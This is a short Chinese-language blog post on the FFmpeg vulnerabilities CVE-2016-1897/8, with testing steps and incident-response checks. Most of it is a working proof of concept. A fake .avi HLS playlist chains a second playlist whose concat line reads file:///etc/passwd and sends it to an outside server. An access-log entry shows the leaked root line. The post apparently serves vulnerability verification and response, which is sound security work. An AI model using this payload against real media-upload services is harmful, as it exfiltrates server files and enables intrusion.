---
title: CVE-2016-1897/8 - FFMpeg漏洞应急分析
date: 2016-05-12 00:22:40
tags: FFMpeg
---

### 测试步骤
>test.avi


```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://xxx.com/?
```

<!--more-->
>header.m3u8	#不要用vim新建此文件，vim新建此文件测试过程无效


```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://blog.safebuff.com/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```
1. header.m3u8上传到blog.safebuff.com服务器上
1. test.avi用户上传时上传文件
1. 在blog.safebuff.com服务器上查看日志/var/log/apache2/access.log文件记录

```
192.168.0.100 - - [11/May/2016:16:18:32 +0000] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 200 520 "-" "Lavf/55.33.100"
```
1. 则表示漏洞存在

### 应急响应

1. 查看服务器日志文件

```
> grep 'root' /var/log/apache2/access.log   #日志文件根据用户设置
```
1. 如果漏洞存在则会在/tmp/目录下生成一个php临时文件

```
root@localhost:/tmp# ls
php0ivRAo  phpP9GW9A  phpfvs0ZL  phphmz0ji  phpvyXZkU
```